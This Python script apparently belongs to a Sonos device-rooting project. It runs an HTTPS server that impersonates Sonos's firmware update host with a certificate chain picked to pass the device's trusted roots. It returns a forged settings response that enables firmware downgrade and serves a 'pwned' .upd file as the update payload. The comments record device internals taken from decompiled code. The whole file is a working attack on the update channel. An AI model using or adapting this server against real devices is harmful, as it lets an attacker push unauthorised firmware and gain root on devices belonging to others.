#!/usr/bin/env python3
"""q57 step 2: HTTPS server presenting the eMudhra chain, serving the
downgrade-policy settings body for /product-settings/v3/settings.

Path: GET /product-settings/v3/settings -> JSON with
  downgradeRestrictions { downgradeMinVersion: "1", allowDowngradeToPrevSWGen: true }
Everything else answers 200 with {} (harmless).

Cert chain served (full, since only the emSign ECC Root CA - G3 root is in the
device bundle; neither EM DV TLS CA - G3B nor emSign Root TLS CA - G3 are):
  leaf (CN=update-firmware.sonos.com)
  <- EM DV TLS CA - G3B
  <- emSign Root TLS CA - G3
  root: emSign ECC Root CA - G3 (in the device's type-22 bundle, byte-verified)

Usage: python3 q57_https_server.py [port] (default 443; needs root for <1024)
"""
import http.server
import json
import ssl
import sys
import threading

CERT = "/tmp/q57-serve/fullchain.pem"
KEY = "/tmp/q57-serve/leaf.key"
LOG = "/tmp/q57-serve/requests.log"
UPD_FILE = "/Users/jemanuel/projects/frankensonos/captures/research/rootbuild/pwned-q57.upd"
NODNS_UPD = "/tmp/q57-serve/pwned-nodns.upd"

# 2026-11-06 (decompile-informed, arming.c): ctx+0x108 (MinVersion string) and
# ctx+0x14e (restrictions-seen flag) are BOTH required to arm. The binder has
# TWO entries for downgradeMinVersion (binding table 0x104f2d74) — one at the
# top level, one under downgradeRestrictions — so serve BOTH shapes.
SETTINGS_BODY = json.dumps({
    "downgradeMinVersion": "57.16-41110",
    "downgradeRestrictions": {
        "downgradeMinVersion": "57.16-41110",
        "allowDowngradeToPrevSWGen": True,
        "denyDowngradeToPrevSwGenList": {"swgen": []},
    },
    "swupdate": {
        "downgradeMinVersion": "57.16-41110",
        "downgradeRestrictions": {
            "downgradeMinVersion": "57.16-41110",
            "allowDowngradeToPrevSWGen": True,
        },
    },
}).encode()

_settings_hits = []
_lock = threading.Lock()


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *a):
        line = "%s %s\n" % (self.address_string(), fmt % a)
        with open(LOG, "a") as f:
            f.write(line)

    def _log_hit(self, tag):
        with _lock:
            _settings_hits.append((tag, self.path))
        with open(LOG, "a") as f:
            f.write("HIT %s %s %s\n" % (tag, self.command, self.path))

    def do_GET(self):
        self._log_hit("GET")
        if "product-settings" in self.path and "settings" in self.path:
            body = SETTINGS_BODY
        elif "pwned-nodns" in self.path:
            try:
                with open(NODNS_UPD, "rb") as f:
                    body = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                with open(LOG, "a") as f:
                    f.write("NODNS-SERVED %s %d bytes\n" % (self.path, len(body)))
                self.wfile.write(body)
            except Exception as e:
                self.log_message("nodns err %s", e)
            return
        elif self.path.endswith(".upd"):
            # the root-fetch deliverable: served as the update payload once
            # /var/run/upgradeinfo is armed (the device's /bin/upgrade fetches it)
            try:
                with open(UPD_FILE, "rb") as f:
                    body = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                with open(LOG, "a") as f:
                    f.write("UPD-SERVED %s %d bytes\n" % (self.path, len(body)))
                self.wfile.write(body)
            except Exception as e:
                self.log_message("upd err %s", e)
            return
        else:
            body = b"{}"
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception as e:
            self.log_message("write err %s", e)

    do_POST = do_GET
    do_HEAD = do_GET


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 443
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), H)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print("q57 settings server on :%d, chain leaf->G3B->RootTLSG3B, root in device bundle" % port)
    srv.serve_forever()


if __name__ == "__main__":
    main()
